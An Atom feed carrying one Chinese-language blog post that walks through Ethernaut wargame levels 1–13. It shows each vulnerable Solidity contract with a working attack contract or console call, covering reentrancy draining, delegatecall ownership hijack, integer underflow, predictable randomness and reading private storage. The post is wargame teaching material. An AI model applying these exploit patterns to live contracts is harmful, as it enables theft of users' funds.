<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Banana69</title>
  
  
  <link href="https://banana69.site/atom.xml" rel="self"/>
  
  <link href="https://banana69.site/"/>
  <updated>2023-02-23T13:40:06.430Z</updated>
  <id>https://banana69.site/</id>
  
  <author>
    <name>Banana69</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ethernaut 题解</title>
    <link href="https://banana69.site/2023/02/23/Ethernaut/"/>
    <id>https://banana69.site/2023/02/23/Ethernaut/</id>
    <published>2023-02-22T16:00:00.000Z</published>
    <updated>2023-02-23T13:40:06.430Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这道题目的要求是取出合约中所有的 ether，但是需要通过 onlyowner 的检查，可以注意到在 <code>receive</code>函数中，<code>owner = msg.sender</code>，所以可以首先向合约中转入ether成为owner，即调用<code>contribute</code>函数转入 ether，然后再调用<code>withdraw</code>函数即可完成该题目。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;<span class="attr">value</span>: toWei(<span class="number">0.0005</span>)&#125;)</span><br><span class="line"><span class="comment">//contract.sendTransaction(&#123;value: 1&#125;)</span></span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure><h3 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line"> constructor</span><br><span class="line"> */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求获取合约的所有权，直接调用<code>Fal1out</code>函数就可以成为 owner。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure><h3 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连续猜对 10 次硬币的正反就可以通过该题目。在题目中 <code>flip</code>会获取到前一区块的哈希值去计算硬币的正反，而而每一个随机数都是可知的，所以可以可以预测随机数。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">function flip(bool _guess) public returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line"> CoinFlip hack;</span><br><span class="line">     constructor(address instance) public &#123;</span><br><span class="line">        hack = CoinFlip(instance);</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function guessFlip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        hack.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>guessFlip</code> 10 次即可通过该题目。</p><h3 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tx.origin</code>表示发起交易的用户账户，<code>msg.sender</code>可以表示合约的地址，想要使<code>tx.origin != msg.sender</code>，只需要部署一个合约在合约中调用<code>changeOwner</code>函数即可。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Caller &#123;</span><br><span class="line">    Telephone hack;</span><br><span class="line">    constructor(address victim) public &#123;</span><br><span class="line">        hack = Telephone(victim);</span><br><span class="line">        hack.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这道题目的要求是增加 token 的数量，在<code>transfer</code>函数处可以改变 token 的数量，在合约中未使用<code>safemath</code>库，所以在<code>balances[msg.sender] -= _value;</code>处可以造成溢出，调用<code>transfer</code>函数即可。</p><p>由于一开始有20个token，使用<code>transfer</code>函数减去<code>21</code>就会造成溢出。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.transfer(level,<span class="number">21</span>)</span><br></pre></td></tr></table></figure><h3 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求获得合约的所有权，由于我们无法直接调用<code>pwn()</code>函数，所以只能通过<code>Delegation</code>合约的回掉函数中的<code>delegatecall</code>发起调用，<code>delegatecall</code>的执行环境在合约<code>Delegation</code>中，而 <code>msg.data</code>又是可控的，直接用 <code>bytes4(keccak256(&quot;pwn()&quot;))</code> 即可通过 <code>delegatecall()</code> 将已部署的 Delegation <code>owner</code> 修改为攻击者自己（msg.sender)。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.utils.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure><p>以下是俩种调用方式的区别：</p><p><img src="/image/Ethernaut.assets/image-20220902101423276.png" alt="image-20220902101423276"></p><h3 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求合约中的余额大于0。使用<code>selfdestruct</code>方法就可以强制将合约中的余额转入某个账户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">   constructor() payable public &#123;</span><br><span class="line">       require(msg.value &gt; 0);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">  function exploit(address payable _target) public payable &#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求打开valult，调用<code>unlock</code>可以进行解锁，但是需要 <code>password</code>，利用 web3py 可以获取到 password 的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, EthereumTesterProvider</span><br><span class="line"></span><br><span class="line">web = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rinkeby.infura.io/v3/&#x27;</span>))</span><br><span class="line">checkConnect = web.isConnected()</span><br><span class="line">web3 = web.eth</span><br><span class="line"></span><br><span class="line">address = <span class="string">&quot;0xCe21072C0010feF4CB6C03F8FC03E944e39Ee17B&quot;</span></span><br><span class="line"><span class="built_in">print</span>(Web3.toText(web3.get_storage_at(address, <span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(Web3.toHex(web3.get_storage_at(address, <span class="number">1</span>)))</span><br><span class="line"><span class="comment">#A very strong secret password :)</span></span><br><span class="line"><span class="comment">#0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span></span><br></pre></td></tr></table></figure><p>然后调用<code>unlock</code>函数即可，由于web3.js不能自动把string解析成byte32类型，所以将 bytes 类型的 <code>password</code>作为参数传入。</p><h3 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价。阻止其他人重获王位来通过这一关。</p><p>在<code>receive</code>函数中可以接收 prize，当prize 大于当前的 king 的prize时就会成为king，如果要阻止其他人成为king，可以在fallback 或者 receive 函数中写入 <code>revert()</code>，使<code>king.transfer(msg.value)</code>失败。</p><p><img src="/image/Ethernaut.assets/image-20220903131148062.png" alt="image-20220903131148062"></p><p>在创建后的第一个king 的prize 为 0.001 ether，只要发送大于 0.001的 ether即可</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(address payable _King) payable public &#123;</span><br><span class="line">        _King.call.value(1 ether).gas(1000000)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() payable external&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考查的重入漏洞，由于在<code>withdraw</code>函数中，首先进行转账操作，然后才将对应账户的余额减去。而且这里的转账利用了<code>call</code>方法，没有 gas 的限制，使用 <code>call</code>进行转账时 EVM 将所有的 gas都用来进行转账。</p><p>solidity 中还有其他俩种转账方式：</p><ul><li><p><strong>transfer：</strong></p><p>要求接收的智能合约中必须有一个<code>fallback</code>或者<code>receive</code>函数，否则会抛出一个错误(error)，并且revert。而且有单笔交易中的操作总gas不能超过2300的限制。transfer 还会在以下俩种情况下抛出错误：</p><ul><li>付款方合约的余额不足，小于所要发送的value</li><li>接收方合约拒绝接收支付</li></ul></li><li><p><strong>send：</strong></p><p>和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。</p></li></ul><p>我们只需要在<code>fallback</code>中重复调用<code>withdraw    </code>函数即可将合约中所有的余额转出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    IReentrance target;</span><br><span class="line">    uint targetValue = 1000000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address _targetAddr) public&#123;</span><br><span class="line">        target = IReentrance(_targetAddr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donateAndWithdraw() public payable&#123;</span><br><span class="line">        require(msg.value &gt;= targetValue);</span><br><span class="line">        target.donate.value(msg.value)(address(this));</span><br><span class="line">        target.withdraw(msg.value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        target.withdraw(targetValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-Elevtor"><a href="#11-Elevtor" class="headerlink" title="11. Elevtor"></a>11. Elevtor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求到达电梯楼层，而<code>Building</code>是一个接口，类似抽象类，而<code>isLastFloor</code>类似一个抽象函数，因此可以自己设计这个函数的内容。题目中的要求是<code>top=true</code>，但在题目中要进入 if 分支，<code> building.isLastFloor(_floor)==false</code>，而top又等于<code>building.isLastFloor(_floor)</code>，所以可以将<code>isLastFloor</code>设置为针对同一个变量的取反函数，第一次调用返回 false，第二次调用返回 true即可满足题目条件。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">bool floor = true;</span><br><span class="line">address target;</span><br><span class="line">Elevator elevator;</span><br><span class="line">function isLastFloor(uint) external returns (bool) &#123;</span><br><span class="line">floor = !floor;</span><br><span class="line">return floor;</span><br><span class="line">&#125;</span><br><span class="line">function exploit(address _addr) public &#123;</span><br><span class="line">elevator = Elevator(_addr);</span><br><span class="line">elevator.goTo(1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求我们输入data数组的第二个元素的前16个字节即可，考察以太坊中状态变量的内存分布。</p><p>该合约的内存布局为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">======================================================    </span><br><span class="line">     unused (31 bytes)  | locked (1 byte)                    slot 0</span><br><span class="line">======================================================</span><br><span class="line">    ID(32 bytes)            slot 1  </span><br><span class="line">======================================================</span><br><span class="line">unused |awkwardness(2)|denomination(1)|flattening(1)         slot 2</span><br><span class="line">======================================================</span><br><span class="line">data[0] 32 bytes                                 slot 3</span><br><span class="line">======================================================</span><br><span class="line">data[1] 32 bytes         slot 4</span><br><span class="line">======================================================</span><br><span class="line">data[2] 32 bytes                                 slot 5</span><br><span class="line">======================================================</span><br></pre></td></tr></table></figure><p>利用 web3py 读出数组 <code>data[2]</code>的内容：</p><h3 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求通过三个<code>gate</code>，第一个与第四关类似，表示发起交易的账户必须是合约账户，不是用户账户， 可以通过部署一个合约，在合约中调用即可；第二个gate要求交易剩余的gas量必须是 8191 的倍数，只需要设置 <code>gas = 8191 *n + x</code>，x表示本次交易需要消耗的gas，可以对 x 进行爆破；第三个gate主要考察 solidity 的类型转换。</p><p>以 <code>_gateKey = 0x12345678eadbeef_</code>为例：</p><ul><li><code>uint32(uint64(_gateKey))</code>转换后会取低位，所以转换后的值为<code>0xdeadbeef</code>，<code>uint16(uint64(_gateKey))</code>也会被转为<code>0xbeef</code>，uint16 和 uin32做比较时，较小的类型 uint16 会在高位填充 0，即填充为<code>0x0000beef</code>进行比较，因此通过第一个 require 就要求<code>_gateKey</code>形为<code>0x********0000****</code>即可；</li><li>第二个 require 